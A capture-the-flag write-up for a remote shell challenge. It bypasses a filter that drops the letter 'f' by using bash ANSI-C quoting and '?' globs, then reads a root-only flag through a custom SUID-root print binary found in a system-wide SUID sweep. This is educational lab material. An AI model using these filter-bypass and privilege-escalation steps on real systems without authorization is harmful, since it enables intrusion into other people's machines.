---
ctf: "Curtin CTF 2026"
title: "Misc 4"
category: "misc"
difficulty: "500"
tags: ["shell-filter-bypass", "suid", "privesc", "ansi-c-quoting", "glob"]
flag_format: "CTF{...}"
date: "2026-11-21"
---

## Challenge

Connect to `nc 56.69.151.28 8004` and find the flag. The connection drops
you into an unprivileged shell as `ctfuser`. Two obstacles stand in the way:

1. The flag is owned by **root** and only root-readable (`0400`).
2. The connection **silently drops the letter `f`** from all input.

## Approach

### Phase 1 — Analyze

No local files provided; the challenge is entirely remote. The shell environment
itself is the artifact to study.

### Phase 2 — Recon

1. **Enumerated the home directory** — only `.bash_logout`, `.bashrc`,
   `.profile` present; no flag here.

2. **Located the flag** by browsing the filesystem (globs sidestep the `f`
   filter for path components):
   ```
   /var/flag/flag   →   -r-------- 1 root root 19 ... (root:root 0400)
   ```

3. **Confirmed privilege situation:**
   ```bash
   id   # uid=1001(ctfuser), no extra groups, no sudo
   ```

4. **Checked for escalation vectors:**
   ```bash
   ps aux                               # only socat + bash, all as ctfuser
   cat /etc/crontab; ls -la /etc/cron.d/  # nothing writable, no cron daemon
   ls -la / /opt /root /srv             # /.rock is Ubuntu ROCK metadata (red herring)
   getcap -r / 2>/dev/null              # no capabilities
   ls -la /usr/bin /bin /usr/sbin | grep rws   # only standard SUID binaries
   ```

5. **Identified the filter bypass** — `$'\x66'` is bash ANSI-C quoting for
   the byte `f`. The input string `$'\x66'` contains **no literal `f`**, so it
   passes the filter and bash expands it to `f`. This lets any `f`-command be
   executed:
   ```bash
   $'\x66ind' / -perm -4000 -type $'\x66' 2>/dev/null
   # equivalent to: find / -perm -4000 -type f
   ```

6. **SUID sweep output:**
   ```
   /etc/print/print        ← non-standard, SUID root
   /usr/bin/su
   /usr/bin/passwd
   /usr/bin/chfn
   /usr/bin/umount
   /usr/bin/chsh
   /usr/bin/gpasswd
   /usr/bin/mount
   ```

### Phase 3 — Infiltrate

**Vulnerability:** `/etc/print/print` is a custom SUID-root binary that prints
the file given as its argument. Because it runs as root, it can read the
root-only flag file.

**Exploit:** The filename `flag` contains an `f`, so use a `?` glob to
reference it without typing `f`:

```bash
/etc/print/print /var/?lag/?lag
# /var/?lag/?lag  →  /var/flag/flag
```

This prints the flag to stdout.

## Tools

- `nc` — initial connection
- Bash ANSI-C quoting (`$'\x66'`) — bypass the `f`-drop filter
- `?` / `*` globs — reference files whose names contain filtered characters
- `/etc/print/print` (SUID root) — the privilege-escalation vector

## Lessons

- `$'\xNN'` (ANSI-C quoting) sidesteps a character-dropping shell filter for
  any command. Generalises: `$'\x<hex>'` works for any single byte.
- `?` / `*` globs let you reference files whose names you can't type literally.
- When standard SUID binaries are all stock and there's no writable cron/service,
  always do a **system-wide SUID sweep** (`find / -perm -4000 -type f`). The
  out-of-place binary (here `/etc/print/print`) is usually the intended vector.
- See also: HTBLabs/Utterly Broken Shell — different filter, same category
  (bash parameter/arithmetic expansion to escape a strict character allowlist).

## Flag

`CTF{redacted}`  ← fill in after live run
